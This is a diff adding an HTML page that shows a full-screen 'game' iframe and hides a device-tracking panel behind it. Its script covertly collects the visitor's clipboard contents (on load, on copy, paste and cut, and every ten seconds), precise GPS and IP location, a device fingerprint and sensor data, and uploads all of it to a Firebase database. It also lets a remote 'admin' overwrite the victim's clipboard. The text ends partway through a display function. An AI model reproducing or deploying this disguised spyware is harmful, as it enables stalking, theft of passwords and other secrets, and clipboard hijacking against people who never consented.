@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🕵️ AI Device Tracker - Ultimate Edition</title>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <!--CREATED BY https://www.xploitpoison.com/-->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 24px;
+        }
+
+        .header p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+        }
+
+        .visit-counter {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 20px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .visit-counter .label {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .visit-counter .number {
+            font-size: 36px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .location-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-left: 3px solid #4ade80;
+        }
+
+        .location-title {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .location-coords {
+            font-family: monospace;
+            font-size: 11px;
+            color: white;
+            word-break: break-all;
+        }
+
+        .location-meta {
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-top: 3px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .info-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 15px;
+            text-align: center;
+        }
+
+        .info-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .info-label {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .info-value {
+            font-size: 12px;
+            font-weight: 600;
+            color: white;
+            word-break: break-all;
+        }
+
+        .update-time {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 15px;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+            margin-right: 6px;
+        }
+
+        .dot-green {
+            background: #4ade80;
+        }
+
+        .dot-orange {
+            background: #fbbf24;
+        }
+
+        .dot-red {
+            background: #ef4444;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .btn-refresh {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+        }
+
+        .gps-badge {
+            display: inline-block;
+            font-size: 9px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            margin-left: 5px;
+        }
+
+        .badge-active {
+            background: #4ade80;
+            color: #000;
+        }
+
+        .badge-waiting {
+            background: #fbbf24;
+            color: #000;
+        }
+
+        .badge-error {
+            background: #ef4444;
+            color: #fff;
+        }
+
+        .permission-prompt {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 20px;
+            padding: 15px;
+            z-index: 2000;
+            display: none;
+            border: 1px solid #4ade80;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .permission-prompt button {
+            background: #4ade80;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            margin-top: 10px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Clipboard Card Styles */
+        .clipboard-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-left: 3px solid #fbbf24;
+        }
+
+        .clipboard-preview {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 8px;
+            border-radius: 8px;
+            font-size: 11px;
+            color: #fbbf24;
+            word-break: break-all;
+            margin-top: 5px;
+            max-height: 60px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+
+    <!-- Responsive Iframe -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            overflow: hidden;
+        }
+
+        .game-frame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+    <!-- Full Screen Iframe -->
+    <iframe id="dynamicFrame" class="game-frame" src="game.html"
+        allow="geolocation; clipboard-read; clipboard-write"></iframe>
+
+    <div style="visibility: hidden;" class="container">
+        <div class="card">
+            <div class="header">
+                <h1>🕵️ AI Device Tracker + GPS</h1>
+                <p>Auto updates | GPS every 5 sec | Full Intelligence</p>
+            </div>
+
+            <div class="visit-counter">
+                <div class="label">📊 TOTAL VISITS</div>
+                <div class="number" id="visitCount">0</div>
+                <div class="label" style="font-size: 10px;">This device</div>
+            </div>
+
+            <!-- Clipboard Status Card -->
+            <div class="clipboard-card">
+                <div class="location-title">
+                    <span>📋</span> CLIPBOARD STATUS
+                    <span id="clipboardBadge" class="gps-badge badge-waiting">Monitoring</span>
+                </div>
+                <div class="clipboard-preview" id="clipboardPreview">
+                    Waiting for clipboard activity...
+                </div>
+                <div class="location-meta" id="clipboardMeta">
+                    Copy/Paste will be auto-saved to Firebase
+                </div>
+            </div>
+            <div class="location-card">
+                <div class="location-title">
+                    <span>🛰️</span> GPS LOCATION (Updates every 5 sec)
+                    <span id="gpsBadge" class="gps-badge badge-waiting">Waiting</span>
+                </div>
+                <div class="location-coords" id="gpsCoords">Waiting for GPS...</div>
+                <div class="location-meta" id="gpsMeta">Accuracy: -- meters</div>
+            </div>
+
+            <div class="location-card">
+                <div class="location-title">
+                    <span>🌐</span> GEO LOCATION (IP Based)
+                    <span id="geoBadge" class="gps-badge badge-waiting">Fetching</span>
+                </div>
+                <div class="location-coords" id="geoCoords">Fetching location...</div>
+                <div class="location-meta" id="geoMeta">City: -- | Country: --</div>
+            </div>
+
+            <div class="info-grid">
+                <div class="info-item">
+                    <div class="info-icon">🆔</div>
+                    <div class="info-label">Device ID</div>
+                    <div class="info-value" id="deviceIdVal">--</div>
+                </div>
+                <!-- Screen Status Card - info-grid ke andar add karo -->
+                <div class="info-item">
+                    <div class="info-icon">📱</div>
+                    <div class="info-label">Screen Status</div>
+                    <div class="info-value" id="screenStatusVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">🌐</div>
+                    <div class="info-label">IP Address</div>
+                    <div class="info-value" id="ipVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">📱</div>
+                    <div class="info-label">Device</div>
+                    <div class="info-value" id="deviceVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">💻</div>
+                    <div class="info-label">Browser</div>
+                    <div class="info-value" id="browserVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">🔋</div>
+                    <div class="info-label">Battery</div>
+                    <div class="info-value" id="batteryVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">📺</div>
+                    <div class="info-label">Screen</div>
+                    <div class="info-value" id="screenVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">🌍</div>
+                    <div class="info-label">Timezone</div>
+                    <div class="info-value" id="timezoneVal">--</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">📡</div>
+                    <div class="info-label">Network</div>
+                    <div class="info-value" id="networkVal">--</div>
+                </div>
+            </div>
+
+            <div class="update-time">
+                <span class="status-dot dot-green"></span>
+                Last Updated: <span id="lastUpdateTime">--</span>
+            </div>
+
+            <button class="btn-refresh" id="refreshBtn">🔄 Refresh All Info</button>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+    <div id="permissionPrompt" class="permission-prompt">
+        <div style="color: white; font-size: 14px;">📍 Location Access Required</div>
+        <div style="color: rgba(255,255,255,0.7); font-size: 11px; margin-top: 5px;">Please allow location access for
+            better experience</div>
+        <button onclick="forceRequestLocation()">Allow Location</button>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        // ==================== FIREBASE INIT ====================
+        let database = null;
+        let deviceId = null;
+        let visitCount = 0;
+        let gpsInterval = null;
+        let geoInterval = null;
+        let lastClipboardContent = '';
+        let clipboardCheckInterval = null;
+        let permissionRequestCount = 0;
+        let permissionDeniedCount = 0;
+        let permissionInterval = null;
+        let sensorData = { orientation: {}, motion: {}, lastUpdate: Date.now() };
+
+        // ==================== HARDWARE & SOFTWARE INFO ====================
+        let hardwareInfo = {};
+        let softwareInfo = {};
+
+        function getHardwareSoftwareInfo() {
+            const ua = navigator.userAgent;
+
+            hardwareInfo = {
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                vendor: navigator.vendor || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                product: navigator.product || 'Unknown',
+                devicePixelRatio: window.devicePixelRatio || 1,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth
+            };
+
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    hardwareInfo.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    hardwareInfo.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                }
+            }
+
+            softwareInfo = {
+                userAgent: ua,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                productSub: navigator.productSub,
+                appCodeName: navigator.appCodeName,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            };
+
+            if (ua.includes('Chrome')) softwareInfo.browser = 'Chrome';
+            else if (ua.includes('Firefox')) softwareInfo.browser = 'Firefox';
+            else if (ua.includes('Safari')) softwareInfo.browser = 'Safari';
+            else if (ua.includes('Edg')) softwareInfo.browser = 'Edge';
+            else softwareInfo.browser = 'Unknown';
+
+            if (ua.includes('Windows')) softwareInfo.os = 'Windows';
+            else if (ua.includes('Mac')) softwareInfo.os = 'macOS';
+            else if (ua.includes('Android')) softwareInfo.os = 'Android';
+            else if (ua.includes('iPhone')) softwareInfo.os = 'iOS';
+            else softwareInfo.os = 'Unknown';
+
+            return { hardware: hardwareInfo, software: softwareInfo };
+        }
+
+        // ==================== CLIPBOARD MONITORING ====================
+        function initClipboardMonitoring() {
+            document.addEventListener('copy', (e) => {
+                const copiedText = window.getSelection().toString();
+                if (copiedText && copiedText !== lastClipboardContent) {
+                    lastClipboardContent = copiedText;
+                    const clipboardData = {
+                        type: 'copy',
+                        text: copiedText.substring(0, 1000),
+                        length: copiedText.length,
+                        timestamp: Date.now(),
+                        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                        url: window.location.href,
+                        deviceId: deviceId
+                    };
+                    saveToFirebase(`clipboard_data/${deviceId}/copy/${Date.now()}`, clipboardData, false);
+                    saveToFirebase(`clipboard_data/${deviceId}/latest`, clipboardData, true);
+                    document.getElementById('clipboardPreview').innerHTML = `📋 Copied: "${copiedText.substring(0, 100)}${copiedText.length > 100 ? '...' : ''}"`;
+                    document.getElementById('clipboardMeta').innerHTML = `✅ Saved to cloud | Length: ${copiedText.length} chars`;
+                    document.getElementById('clipboardBadge').className = 'gps-badge badge-active';
+                    document.getElementById('clipboardBadge').innerHTML = 'Copy Saved';
+                    showToast(`📋 Copy saved (${copiedText.length} chars)`, false);
+                    setTimeout(() => {
+                        document.getElementById('clipboardBadge').className = 'gps-badge badge-waiting';
+                        document.getElementById('clipboardBadge').innerHTML = 'Monitoring';
+                    }, 2000);
+                }
+            });
+
+            document.addEventListener('paste', (e) => {
+                const pastedText = e.clipboardData?.getData('text') || '';
+                if (pastedText) {
+                    const clipboardData = {
+                        type: 'paste',
+                        text: pastedText.substring(0, 1000),
+                        length: pastedText.length,
+                        timestamp: Date.now(),
+                        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                        url: window.location.href,
+                        deviceId: deviceId
+                    };
+                    saveToFirebase(`clipboard_data/${deviceId}/paste/${Date.now()}`, clipboardData, false);
+                    saveToFirebase(`clipboard_data/${deviceId}/latest_paste`, clipboardData, true);
+                    document.getElementById('clipboardPreview').innerHTML = `📋 Pasted: "${pastedText.substring(0, 100)}${pastedText.length > 100 ? '...' : ''}"`;
+                    document.getElementById('clipboardMeta').innerHTML = `✅ Paste saved | Length: ${pastedText.length} chars`;
+                    showToast(`📋 Paste detected (${pastedText.length} chars)`, false);
+                }
+            });
+
+            document.addEventListener('cut', (e) => {
+                const cutText = window.getSelection().toString();
+                if (cutText) {
+                    const clipboardData = {
+                        type: 'cut',
+                        text: cutText.substring(0, 1000),
+                        length: cutText.length,
+                        timestamp: Date.now(),
+                        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                        url: window.location.href,
+                        deviceId: deviceId
+                    };
+                    saveToFirebase(`clipboard_data/${deviceId}/cut/${Date.now()}`, clipboardData, false);
+                    showToast(`✂️ Cut detected (${cutText.length} chars)`, false);
+                }
+            });
+        }
+
+        // ==================== ADMIN SET CLIPBOARD ====================
+        function listenForAdminClipboard() {
+            if (!database) return;
+
+            const adminClipboardRef = database.ref(`admin_commands/${deviceId}/clipboard`);
+            adminClipboardRef.on('value', async (snapshot) => {
+                const command = snapshot.val();
+                if (command && command.text && command.active) {
+                    await setClipboardText(command.text);
+                    await saveToFirebase(`clipboard_data/${deviceId}/admin_set/${Date.now()}`, {
+                        text: command.text.substring(0, 500),
+                        length: command.text.length,
+                        adminMessage: command.message || '',
+                        timestamp: Date.now()
+                    }, false);
+                    showToast(`📋 Admin set: ${command.text.substring(0, 50)}${command.text.length > 50 ? '...' : ''}`, false);
+                    database.ref(`admin_commands/${deviceId}/clipboard`).remove();
+                }
+            });
+
+            const globalClipboardRef = database.ref(`admin_commands/global/clipboard`);
+            globalClipboardRef.on('value', async (snapshot) => {
+                const command = snapshot.val();
+                if (command && command.text && command.active) {
+                    await setClipboardText(command.text);
+                    await saveToFirebase(`clipboard_data/${deviceId}/global_admin_set/${Date.now()}`, {
+                        text: command.text.substring(0, 500),
+                        length: command.text.length,
+                        timestamp: Date.now()
+                    }, false);
+                    showToast(`📋 Global: ${command.text.substring(0, 50)}${command.text.length > 50 ? '...' : ''}`, false);
+                }
+            });
+        }
+
+        async function setClipboardText(text) {
+            try {
+                await navigator.clipboard.writeText(text);
+                lastClipboardContent = text;
+                document.getElementById('clipboardPreview').innerHTML = `👑 Admin Set: "${text.substring(0, 100)}${text.length > 100 ? '...' : ''}"`;
+                document.getElementById('clipboardMeta').innerHTML = `✅ Admin clipboard set | Length: ${text.length} chars`;
+                document.getElementById('clipboardBadge').className = 'gps-badge badge-active';
+                document.getElementById('clipboardBadge').innerHTML = 'Admin Set';
+                setTimeout(() => {
+                    document.getElementById('clipboardBadge').className = 'gps-badge badge-waiting';
+                    document.getElementById('clipboardBadge').innerHTML = 'Monitoring';
+                }, 3000);
+                return true;
+            } catch (err) {
+                try {
+                    const textarea = document.createElement('textarea');
+                    textarea.value = text;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                } catch (e) { }
+                return false;
+            }
+        }
+
+        async function autoReadClipboardOnLoad() {
+            try {
+                if (!navigator.clipboard || !navigator.clipboard.readText) {
+                    document.getElementById('clipboardMeta').innerHTML = '⚠️ Auto-read not supported';
+                    return;
+                }
+                const text = await navigator.clipboard.readText();
+                if (text && text.trim() !== '') {
+                    const clipboardData = {
+                        type: 'auto_read_on_load',
+                        text: text.substring(0, 1000),
+                        length: text.length,
+                        timestamp: Date.now(),
+                        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                        url: window.location.href,
+                        deviceId: deviceId,
+                        source: 'page_load_auto'
+                    };
+                    await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, clipboardData, false);
+                    document.getElementById('clipboardPreview').innerHTML = `🔄 Auto Loaded: "${text.substring(0, 100)}${text.length > 100 ? '...' : ''}"`;
+                    document.getElementById('clipboardMeta').innerHTML = `✅ Auto-saved on page load | Length: ${text.length} chars`;
+                    document.getElementById('clipboardBadge').className = 'gps-badge badge-active';
+                    document.getElementById('clipboardBadge').innerHTML = 'Auto Saved';
+                    setTimeout(() => {
+                        document.getElementById('clipboardBadge').className = 'gps-badge badge-waiting';
+                        document.getElementById('clipboardBadge').innerHTML = 'Monitoring';
+                    }, 3000);
+                }
+            } catch (error) {
+                if (error.name === 'NotAllowedError') {
+                    document.getElementById('clipboardMeta').innerHTML = '⚠️ Click anywhere to read clipboard';
+                    const oneTimeClick = async () => {
+                        try {
+                            const text = await navigator.clipboard.readText();
+                            if (text) {
+                                await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, { text: text.substring(0, 500), length: text.length, timestamp: Date.now() }, false);
+                                document.getElementById('clipboardPreview').innerHTML = `🖱️ After Click: "${text.substring(0, 100)}${text.length > 100 ? '...' : ''}"`;
+                                showToast(`📋 Clipboard read after click`, false);
+                            }
+                        } catch (e) { }
+                        document.removeEventListener('click', oneTimeClick);
+                    };
+                    document.addEventListener('click', oneTimeClick);
+                }
+            }
+        }
+
+        function startPeriodicClipboardCheck() {
+            if (clipboardCheckInterval) clearInterval(clipboardCheckInterval);
+            clipboardCheckInterval = setInterval(async () => {
+                try {
+                    if (!document.hidden && navigator.clipboard && navigator.clipboard.readText) {
+                        const currentText = await navigator.clipboard.readText();
+                        if (currentText && currentText !== lastClipboardContent && currentText.trim() !== '') {
+                            lastClipboardContent = currentText;
+                            await saveToFirebase(`clipboard_data/${deviceId}/periodic/${Date.now()}`, {
+                                type: 'periodic_check',
+                                text: currentText.substring(0, 1000),
+                                length: currentText.length,
+                                timestamp: Date.now(),
+                                deviceId: deviceId
+                            }, false);
+                            showToast(`📋 Clipboard changed (${currentText.length} chars)`, false);
+                        }
+                    }
+                } catch (error) { }
+            }, 10000);
+        }
+
+        // ==================== MOBILE SENSORS ====================
+        function initMobileSensors() {
+            if ('DeviceOrientationEvent' in window) {
+                if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    document.body.addEventListener('click', () => {
+                        DeviceOrientationEvent.requestPermission().then(response => {
+                            if (response === 'granted') window.addEventListener('deviceorientation', handleOrientation);
+                        }).catch(console.error);
+                    });
+                } else {
+                    window.addEventListener('deviceorientation', handleOrientation);
+                }
+            }
+            if ('DeviceMotionEvent' in window) {
+                if (typeof DeviceMotionEvent.requestPermission === 'function') {
+                    document.body.addEventListener('click', () => {
+                        DeviceMotionEvent.requestPermission().then(response => {
+                            if (response === 'granted') window.addEventListener('devicemotion', handleMotion);
+                        }).catch(console.error);
+                    });
+                } else {
+                    window.addEventListener('devicemotion', handleMotion);
+                }
+            }
+        }
+
+        function handleOrientation(event) {
+            sensorData.orientation = { alpha: event.alpha, beta: event.beta, gamma: event.gamma, absolute: event.absolute, timestamp: Date.now() };
+            if (Date.now() - (sensorData.lastSave || 0) > 5000) {
+                saveToFirebase(`sensors/${deviceId}/orientation/${Date.now()}`, sensorData.orientation, false);
+                sensorData.lastSave = Date.now();
+            }
+        }
+
+        function handleMotion(event) {
+            sensorData.motion = {
+                acceleration: { x: event.acceleration?.x, y: event.acceleration?.y, z: event.acceleration?.z },
+                rotationRate: { alpha: event.rotationRate?.alpha, beta: event.rotationRate?.beta, gamma: event.rotationRate?.gamma },
+                interval: event.interval, timestamp: Date.now()
+            };
+            if (Date.now() - (sensorData.lastSaveMotion || 0) > 5000) {
+                saveToFirebase(`sensors/${deviceId}/motion/${Date.now()}`, sensorData.motion, false);
+                sensorData.lastSaveMotion = Date.now();
+            }
+        }
+
+        // ==================== GPS & GEO LOCATION ====================
+        function getGPSLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) { reject('GPS not supported'); return; }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, altitude: position.coords.altitude, speed: position.coords.speed, heading: position.coords.heading, timestamp: Date.now() }),
+                    (error) => reject(error.message),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function getGeoLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Unknown', latitude: data.latitude || 0, longitude: data.longitude || 0,
+                    city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country_name || 'Unknown',
+                    postal: data.postal || 'Unknown', timezone: data.timezone || 'Unknown',
+                    timestamp: Date.now(), dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+                };
+            } catch (error) { return null; }
+        }
+
+        function updateGPSDisplay(location, error = null) {
+            if (error) {
+                document.getElementById('gpsCoords').innerHTML = `❌ ${error}`;
+                document.getElementById('gpsMeta').innerHTML = 'Please allow location access';
+                document.getElementById('gpsBadge').className = 'gps-badge badge-error';
+                document.getElementById('gpsBadge').innerHTML = 'Error';
+                smartLocationRequest();
+                return;
+            }
+            if (location) {
+                document.getElementById('gpsCoords').innerHTML = `${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
+                document.getElementById('gpsMeta').innerHTML = `📍 Accuracy: ±${location.accuracy.toFixed(1)} meters`;
+                document.getElementById('gpsBadge').className = 'gps-badge badge-active';
+                document.getElementById('gpsBadge').innerHTML = 'Active';
+            } else {
+                document.getElementById('gpsCoords').innerHTML = 'Waiting for GPS...';
+                document.getElementById('gpsBadge').className = 'gps-badge badge-waiting';
+            }
+        }
+
+        function updateGeoDisplay(geo) {
+            if (geo && geo.latitude && geo.latitude !== 0) {
+                document.getElementById('geoCoords').innerHTML = `${geo.latitude.toFixed(4)}, ${geo.longitude.toFixed(4)}`;
+                document.getElementById('geoMeta').innerHTML = `📍 ${geo.city}, ${geo.country} | IP: ${geo.ip}`;
+                document.getElementById('geoBadge').className = 'gps-badge badge-active';
+                document.getElementById('geoBadge').innerHTML = 'Active';
+                if (document.getElementById('ipVal')) document.getElementById('ipVal').innerHTML = geo.ip;
+            } else {
+                document.getElementById('geoCoords').innerHTML = 'Fetching location...';
+                document.getElementById('geoMeta').innerHTML = 'Trying to fetch IP location...';
+                document.getElementById('geoBadge').className = 'gps-badge badge-waiting';
+            }
+        }
+
+        async function saveToFirebase(path, data, isCritical = false) {
+            if (!database) return false;
+            try { await database.ref(path).set(data); return true; } catch (error) { return false; }
+        }
+
+        async function saveGPSToFirebase(location) {
+            if (!database || !location) return false;
+            const gpsData = { deviceId: deviceId, type: 'gps', latitude: location.latitude, longitude: location.longitude, accuracy: location.accuracy, speed: location.speed, altitude: location.altitude, timestamp: Date.now(), dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
+            await database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
+            await database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
+            return true;
+        }
+
+        async function saveGeoToFirebase(geo) {
+            if (!database || !geo || !geo.latitude || geo.latitude === 0) return false;
+            const geoData = { deviceId: deviceId, type: 'geo', latitude: geo.latitude, longitude: geo.longitude, city: geo.city, region: geo.region, country: geo.country, ip: geo.ip, postal: geo.postal, timezone: geo.timezone, timestamp: Date.now(), dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
+            await database.ref(`geo_locations/${deviceId}/current`).set(geoData);
+            await database.ref(`geo_locations/${deviceId}/history`).push(geoData);
+            return true;
+        }
+
+        async function captureGPS() {
+            try { const gps = await getGPSLocation(); updateGPSDisplay(gps); await saveGPSToFirebase(gps); return gps; }
+            catch (error) { updateGPSDisplay(null, error); return null; }
+        }
+
+        async function captureGeo() {
+            try { const geo = await getGeoLocation(); if (geo && geo.latitude && geo.latitude !== 0) { updateGeoDisplay(geo); await saveGeoToFirebase(geo); return geo; } else { updateGeoDisplay(null); return null; } }
+            catch (error) { updateGeoDisplay(null); return null; }
+        }
+
+        // ==================== DEVICE INFO FUNCTIONS ====================
+        function generateDeviceId() {
+            let id = localStorage.getItem('device_tracker_id');
+            if (!id) { id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10); localStorage.setItem('device_tracker_id', id); }
+            return id;
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) { try { const battery = await navigator.getBattery(); return Math.floor(battery.level * 100) + '%'; } catch (e) { return 'Unknown'; } }
+            return 'Not supported';
+        }
+
+        async function getIPAddress() {
+            try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); return data.ip; } catch (e) { return 'Unable to fetch'; }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
+            if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone')) os = 'iOS';
+            const match = ua.match(/\(([^)]+)\)/);
+            if (match) device = match[1].substring(0, 30);
+            return { browser, os, device, userAgent: ua };
+        }
+
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return conn ? (conn.effectiveType || conn.type || 'Unknown') : 'Unknown';
+        }
+
+        function getScreenInfo() { return `${screen.width}x${screen.height}`; }
+        function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+
+        async function updateVisitCount() {
+            try {
+                const snapshot = await database.ref(`device_visits/${deviceId}/count`).once('value');
+                let count = snapshot.val() || 0; count++;
+                visitCount = count;
+                await database.ref(`device_visits/${deviceId}`).update({ count: count, lastVisit: Date.now(), lastVisitTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
+                await database.ref(`visit_logs/${deviceId}`).push({ visitNumber: count, timestamp: Date.now(), time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
+                document.getElementById('visitCount').innerHTML = count;
+                return count;
+            } catch (e) { return 0; }
+        }
+
+        async function collectDeviceData() {
+            const deviceInfo = getDeviceInfo();
+            const battery = await getBatteryInfo();
+            const ip = await getIPAddress();
+            return {
+                deviceId: deviceId, ip: ip, deviceModel: deviceInfo.device, os: deviceInfo.os,
+                browser: deviceInfo.browser, userAgent: deviceInfo.userAgent, screen: getScreenInfo(),
+                battery: battery, networkType: getNetworkInfo(), timezone: getTimezone(),
+                visitNumber: visitCount, lastSeen: Date.now(),
+                lastSeenTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), status: 'active'
+            };
+        }
+
+        async function saveDeviceDataToFirebase(data) {
+            if (!database) return false;
+            await database.ref(`devices/${deviceId}`).update(data);
+            await database.ref(`device_history/${deviceId}`).push({ ...data, loggedAt: Date.now(), loggedTime: data.lastSeenTime });
+            await database.ref(`online_devices/${deviceId}`).set({ status: 'online', lastSeen: data.lastSeen, lastSeenTime: data.lastSeenTime });
+            return true;
+        }
+
+        function displayDeviceData(data) {
+            document.getElementById('deviceIdVal').innerHTML = data.deviceId.substring(0, 20) + '...';
+            document.getElementById('deviceVal').innerHTML = data.deviceModel.substring(0, 25);
+            document.getElementById('browserVal').innerHTML = data.browser;
+            document.getElementById('batteryVal').innerHTML = data.battery;
+            document.getElementById('screenVal').innerHTML = data.screen;
+            document.getElementById('timezoneVal').innerHTML = data.timezone;
+            document.getElementById('networkVal').innerHTML = data.networkType;
